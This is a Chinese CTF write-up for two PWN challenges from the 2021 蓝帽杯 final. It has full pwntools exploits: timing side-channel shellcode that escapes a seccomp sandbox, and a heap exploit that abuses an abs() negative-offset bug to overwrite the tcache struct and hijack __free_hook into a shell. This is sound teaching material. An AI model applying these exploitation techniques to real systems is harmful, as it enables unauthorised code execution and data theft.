> 原文链接: https://www.anquanke.com//post/id/252545 


# 2021 蓝帽杯 Final PWN Writeup


                                阅读量   
                                **15751**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t013ef44b3ba962bc75.jpg)](https://p4.ssl.qhimg.com/t013ef44b3ba962bc75.jpg)



## PWN

### <a class="reference-link" name="secretcode"></a>secretcode

类似的题目遇到过很多次，主要原理都是通过侧信道来窃取数据，这次则是在原来的基础上加大了限制来提高利用难度。

**<a class="reference-link" name="%E6%B2%99%E7%AE%B1%E5%88%86%E6%9E%90"></a>沙箱分析**

使用 IDA 打开后查看伪代码

[![](https://p4.ssl.qhimg.com/t01c14b23b0ccc70a3f.png)](https://p4.ssl.qhimg.com/t01c14b23b0ccc70a3f.png)

根据程序的内容可以大概得出程序的意义，在开启沙箱保护的情况下，要求你输入一段无 NULL （由于使用 strcpy 来复制内容）的 shellcode，并执行得到 Flag。

遇到这种情况，我们首先应该尝试使用 seccomp-tools 来查看沙箱内容，再根据沙箱的要求来思考做题方法，但是这里尝试使用 seccomp-tools 直接报错

[![](https://p1.ssl.qhimg.com/t0156cc5ec50c4dfe70.png)](https://p1.ssl.qhimg.com/t0156cc5ec50c4dfe70.png)

这里提示的是 Permission denied 的错误，所以我们在前面加个 sudo 来查看沙箱内容

[![](https://p5.ssl.qhimg.com/t01a744c81cf357a40c.png)](https://p5.ssl.qhimg.com/t01a744c81cf357a40c.png)

沙箱的内容简单翻译后就是，只允许 open 和 read 这两个系统调用，并且要求 read 打开 fd 大于 0x14

**<a class="reference-link" name="%E8%A7%A3%E5%86%B3%20gdb%20%E9%99%84%E5%8A%A0%E9%97%AE%E9%A2%98"></a>解决 gdb 附加问题**

发现使用 gdb 调试会出错，无法成功附加，问题大概也是因为没有 root 权限，这里的解决思路是 patch 掉代码中相应的代码。

[![](https://p0.ssl.qhimg.com/t0187e6028d63923d2f.png)](https://p0.ssl.qhimg.com/t0187e6028d63923d2f.png)

尝试单步调试查找问题来源，发现在以下函数执行后，gdb 程序报错

[![](https://p2.ssl.qhimg.com/t01ab65dfc5351b3b58.png)](https://p2.ssl.qhimg.com/t01ab65dfc5351b3b58.png)

此指令在 IDA 中对应的代码为

[![](https://p1.ssl.qhimg.com/t013b471530dc3f776b.png)](https://p1.ssl.qhimg.com/t013b471530dc3f776b.png)

故我们使用快捷键 Ctrl + Alt + K 调用出 KeyPatch 的界面，将其内容修改为 nop 指令

[![](https://p1.ssl.qhimg.com/t016c02a5df4427dbe3.png)](https://p1.ssl.qhimg.com/t016c02a5df4427dbe3.png)

修改之后再执行 gdb 调试就不会出现问题

[![](https://p2.ssl.qhimg.com/t01c16794a7f066bb4f.png)](https://p2.ssl.qhimg.com/t01c16794a7f066bb4f.png)

**<a class="reference-link" name="%E7%BC%96%E5%86%99%20Shellcode"></a>编写 Shellcode**

这一部应该是题目的核心，要求我们写一段在 0x40 大小内的 shellcode，实现侧信道攻击得到 Flag 数据。并且因为这里 read 函数的限制，我们也无法二次读入一段 shellcode 来简化 shellcode 编写过程。

这里的侧信道攻击指的就是通过程序延迟时间等信息来泄露出一些不可以直接输出的内容，在我的理解中，SQL 注入中的时间延迟盲注也是类似的一种侧信道攻击。而在这道题目中，我们就给程序设置卡死或出错退出，来推断出汇编中执行指令的 True 或者 False。

我们这里就是利用这个思路，再配合上二分查找，这样就能够在短短几次中快速的确定 Flag 中某位的值。

**具体过程**

我们可以根据 open 的返回值（RAX）再结合 cmp 指令来确定此时打开的 fd 是否满足沙箱要求（fd &gt; 0x14），直到满足要求后再调用 read 读取 Flag 数据，再使用 ja 指令判定某位（i）的 Flag 是否大于某个值（mid）。

根据以上思路编写的 Shellcode

```
open:  
/* open(file='./flag', oflag=0, mode=0) */
/* push './flag\x00' */
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f2e
xor [rsp], rax
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
/* call open() */
push SYS_open /* 2 */
pop rax
syscall

cmp ax, 0x15
jne open
mov rdi, rax
xor rax, rax
mov cl, 0xff
mov esi, ecx
mov edx, esi
syscall

loop:
mov al, [rdx + `{`i`}`]
cmp al, `{`mid`}`
ja loop
```

**<a class="reference-link" name="EXP"></a>EXP**

```
import time
from pwn import *
context.log_level = "ERROR"
context.arch = "amd64"
flag = "flag`{`"
for i in range(len(flag), 0x20):
    l = 0
    r = 127
    while l &lt; r:
        mid = (l + r) &gt;&gt; 1
        sh = process('./chall')
        # sh = remote('47.104.169.149', 25178)
        mmap = 0x10000
        orw_payload = "open:" + shellcraft.open('./flag')
        orw_payload += '''cmp ax, 0x15
               jne open
               mov rdi, rax
               xor rax, rax
               mov cl, 0xff
               mov esi, ecx
               mov edx, esi
               syscall
               loop:
               mov al, [rdx + %d]
               cmp al, %d
               ja loop
               ''' % (i, mid)
        shellcode = asm(orw_payload)
        sh.sendafter('======== Input your secret code ========', shellcode)
        st = time.time()
        try:
            while True:
                cur = sh.recv(timeout=0.01)
                if time.time() - st &gt; 0.05:
                    l = mid + 1
                    break
        except EOFError:
            r = mid
        sh.close()
    flag += chr(l)
    print flag
```

### <a class="reference-link" name="normal-babynote"></a>normal-babynote

非常典型的菜单堆题，又被打成了签到题。

[![](https://p0.ssl.qhimg.com/t0135049138727c2226.png)](https://p0.ssl.qhimg.com/t0135049138727c2226.png)

Ubuntu GLIBC 2.27-3ubuntu1.4，存在 tcache double free 检测，无沙箱。

**<a class="reference-link" name="%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"></a>函数分析**

<a class="reference-link" name="Add%20%E5%87%BD%E6%95%B0"></a>**Add 函数**

[![](https://p3.ssl.qhimg.com/t016fbbffd4cf95d723.png)](https://p3.ssl.qhimg.com/t016fbbffd4cf95d723.png)

要求申请的 size 在 0x2F0 内，并且最多申请 16 个堆块，也就是允许申请可以放入 Tcache 中的堆块，可以方便我们利用。

<a class="reference-link" name="Edit%20%E5%87%BD%E6%95%B0"></a>**Edit 函数**

[![](https://p1.ssl.qhimg.com/t01cf3c2bf53609850d.png)](https://p1.ssl.qhimg.com/t01cf3c2bf53609850d.png)

使用 abs32 对 offset 进行取整并且对 size 进行取模，看到 abs 函数就要非常敏感，因为在储存有符号数的时候，补码的范围决定了最小的负数（-0x80000000）取绝对值后的结果无法表示，所以此时取绝对值后的结果还是（-0x80000000），类似的还有当最小的负数除以 -1 的时候，会触发**算数异常 SIGFPE**，另一种触发方法就是除 0。

结合这里对 get_int 的分析，发现这里确实存在 abs 漏洞，允许 offset 为负数从而导致向前溢出。

同时这里的 read_content 函数会用 0 截断字符串且不存在 off by null 的漏洞。

<a class="reference-link" name="Delete%20%E5%87%BD%E6%95%B0"></a>**Delete 函数**

[![](https://p5.ssl.qhimg.com/t01a5076590f7b30059.png)](https://p5.ssl.qhimg.com/t01a5076590f7b30059.png)

free 之后把野指针置 0，这样的做法是正确的。

<a class="reference-link" name="Show%20%E5%87%BD%E6%95%B0"></a>**Show 函数**

[![](https://p2.ssl.qhimg.com/t0153ede1c110ef8371.png)](https://p2.ssl.qhimg.com/t0153ede1c110ef8371.png)

使用 puts 输出堆块内容，但是由于在 add 和 edit 的过程中会用 0 截断，从而导致这里需要先构造出堆重叠才能够泄露出 libc 地址。

**<a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用**

<a class="reference-link" name="%E8%AE%A1%E7%AE%97%E5%87%BA%E5%90%88%E9%80%82%E7%9A%84%20SIZE"></a>**计算出合适的 SIZE**

由于存在向前溢出且版本是 glibc2.27（存在 Tcache），所以我们就会想办法向前溢出到 Tcache Struct 那块空间来实现申请任意地址堆块。由于向前溢出的长度取决于我们申请堆块的长度取模后的结果，所以我们需要选择一个合适的长度以至于可以正好向前溢出到 Tcache Struct，我这里编写一个程序来爆破计算。

```
#include &lt;stdio.h&gt;

int main()
`{`
    for (int i = 1; i &lt;= 0x2f0; i++)
    `{`
        printf("SIZE = 0x%X, OFFSET = -0x%X\n", i, 0x80000000 % i);
    `}`
    return 0;
`}`
```

观察结果，发现 SIZE = 0x2C4 的溢出长度最长，能够满足我们的要求。

<a class="reference-link" name="%E6%9E%84%E9%80%A0%E5%A0%86%E9%87%8D%E5%8F%A0"></a>**构造堆重叠**

我们能够覆盖到 Tcache Struct 后还需要考虑如何泄露出 libc 地址，对于这道题来说，我们可以想办法先释放一个堆块到 Tcache Struct，然后再通过部分覆盖把之前释放的堆块的地址末尾字节踩为 0，再申请得到就可以构造出堆重叠。得到堆重叠后，再次覆盖把 tcache 的 counts 改为 7，再次释放就可以把堆块放到 unsortedbin 中，堆块的 fd 指针上存留的就是 libc 地址。

<a class="reference-link" name="%E5%8A%AB%E6%8C%81__free_hook"></a>**劫持__free_hook**

由于这道题没有开沙箱，所以我们直接改 Tcache Struct 到__free_hook，再劫持其内容为 system 函数的指针，释放某个内容为“sh”的堆块时就会调用 system(“sh”)来 getshell。

**<a class="reference-link" name="EXP"></a>EXP**

```
from pwn import *

elf = None
libc = None
file_name = "./chall"


# context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd `{``}`".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=&gt;")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --&gt; " + hex(text_base + addr))
        gdb.attach(sh, 'b *`{``}`'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count &lt; 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def choice(idx):
    sh.sendlineafter("&gt; ", str(idx))


def add(size, content):
    choice(1)
    sh.sendlineafter("size&gt; ", str(size))
    sh.sendlineafter('msg&gt; ', content)


def edit(idx, offset, content):
    choice(2)
    sh.sendlineafter("idx&gt; ", str(idx))
    sh.sendlineafter("offset&gt; ", str(offset))
    sh.sendafter("msg&gt; ", content)


def delete(idx):
    choice(3)
    sh.sendlineafter("idx&gt; ", str(idx))


def show(idx):
    choice(4)
    sh.sendlineafter("idx&gt; ", str(idx))


def pwn(sh, elf, libc):
    context.log_level = "debug"
    add(0x58, 'sh\x00')  # 0
    add(0x2c4, 'wjh')  # 1
    add(0x168, 'wjh')  # 2
    add(0x88, 'wjh')  # 3
    add(0x88, 'wjh')  # 4
    delete(4)

    edit(1, -0x80000000, p64(0) + p64(0x251) + '\x00' * 7 + '\x07' + '\x00' * (0x78 - 8) + '\n')

    add(0x88, 'wjh')  # 5
    edit(1, -0x80000000, p64(0) + p64(0x251) + '\x00' * 7 + '\x07' + '\x00' * (0x78 - 8) + '\n')
    delete(3)
    show(5)
    libc_base = get_address(sh, True, info='libc_base:\t', offset=-0x3ebca0)
    free_hook_addr = libc_base + 0x3ed8e8
    system_addr = libc_base + 0x4f550
    edit(1, -0x80000000, p64(0) + p64(0x251) + '\x00' * 7 + '\x01' + '\x00' * (0x78 - 8) + p64(free_hook_addr) + '\n')
    add(0x88, p64(system_addr))
    # gdb.attach(sh, "b *$rebase(0x0000000000000E43)")
    delete(0)
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`', flag).group())
```



## 总结

这次的 PWN 的题目虽然难度适中，但是很有新意，有我最喜欢的构造 shellcode 的题目，也有比较有创意的向前溢出堆题，这些题目的利用方法和分析过程都非常值得大家学习。侧信道的题目在目前已经出现过好多次了，从一个新颖的手法转变成为一个应该比较熟悉的利用方法，在我的 EXP 中存在其他 Writeup 从来未有的二分查找来快速确定字节内容，这样的方法速度相较于传统方法要快很多，我认为值得大家当做一个模板存下来。
